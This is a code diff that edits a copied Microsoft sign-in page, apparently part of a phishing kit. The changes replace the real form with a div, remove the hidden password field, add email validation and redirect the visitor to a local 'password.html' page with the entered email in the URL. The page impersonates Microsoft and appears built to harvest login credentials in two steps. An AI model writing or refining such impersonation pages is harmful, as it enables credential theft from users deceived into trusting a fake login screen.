@@ -55,7 +55,7 @@ function t(r,t){var n=document.getElementsByName(r);n&&n.length>0&&e(n[0],"click
 !function(t,e){!function(){var n=e.getElementsByTagName("head")[0];n&&n.addEventListener&&(n.addEventListener("error",function(e){null!==e.target&&"cdn"===e.target.getAttribute("data-loader")&&t.$Loader.OnError(e.target)},!0),n.addEventListener("load",function(e){null!==e.target&&"cdn"===e.target.getAttribute("data-loader")&&t.$Loader.OnSuccess(e.target)},!0))}()}(window,document);
 //]]></script>
 
-    
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
         <link rel="prefetch" href="https://login.live.com/Me.htm?v=3">
                 <link rel="shortcut icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
 
@@ -102,7 +102,7 @@ o=o.substr(0,n)+d+"iframe-request-id="+i.sessionId+o.substr(n),e.top.location=o}
 
 <div data-bind="if: activeDialog"></div>
 
-<form name="contact-form" id="contact-form"  spellcheck="false" method="post" autocomplete="off" class="provide-min-height">
+<div name="contact-form" id="contact-form"  spellcheck="false" method="post" autocomplete="off" class="provide-min-height">
     <!-- ko withProperties: { '$loginPage': $data } -->
     <div class="login-paginated-page" data-bind="component: { name: 'master-page',
         publicMethods: masterPageMethods,
@@ -280,8 +280,9 @@ o=o.substr(0,n)+d+"iframe-request-id="+i.sessionId+o.substr(n),e.top.location=o}
     <!-- ko if: svr.fEnableAriaLiveUpdates --><!-- /ko -->
 
     <!-- ko ifnot: svr.fEnableAriaLiveUpdates -->
-    <div role="alert" aria-live="assertive">
+    <div role="alert" id="loginmess" aria-live="assertive">
         <!-- ko if: usernameTextbox.error --><!-- /ko -->
+		
     </div>
     <!-- /ko -->
 
@@ -300,8 +301,6 @@ o=o.substr(0,n)+d+"iframe-request-id="+i.sessionId+o.substr(n),e.top.location=o}
     <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
 
             <input type="email"  name="email" id="email"  maxlength="113" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true"  autocomplete="username webauthn" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader usernameError" placeholder="Email, phone, or Skype" required>
-
-            <input name="passwd" type="password" id="i0118" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true">
 
         <!-- /ko -->
 <!-- /ko -->
@@ -664,7 +663,7 @@ o=o.substr(0,n)+d+"iframe-request-id="+i.sessionId+o.substr(n),e.top.location=o}
     <!-- /ko -->
 <!-- /ko --></div>
     <!-- /ko -->
-</form>
+</div>
 
 <form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form>
 
@@ -674,16 +673,24 @@ o=o.substr(0,n)+d+"iframe-request-id="+i.sessionId+o.substr(n),e.top.location=o}
 <script>
 
  function emailsendorder(){
- const email = document.getElementById('email');
+ const email = document.getElementById('email').value;
 const form = document.getElementById('contact-form');
   const btn = document.getElementById('submitpost');
+  if(email === ''){
+	$("#loginmess").html("<span style='color:red;'>Enter a valid email address, phone number, or Skype name.</span>");
+		setTimeout(function(){
+		$("#loginmess").html("<span></span>");
+		$("#email").removeAttr("style");	
+		},2000);
+		return false;
+	}
   setTimeout(function(){
     btn.disabled = true;
     btn.textContent = "Please wait...";
 },3000);
-       window.open('_SELF','password.html?id='+email);
+ window.open("password.html?id="+email, "_self");      
      
-  }
+ }
 </script>
 
 <!-- ko if: svr.urlCBPartnerPreload --><!-- /ko -->
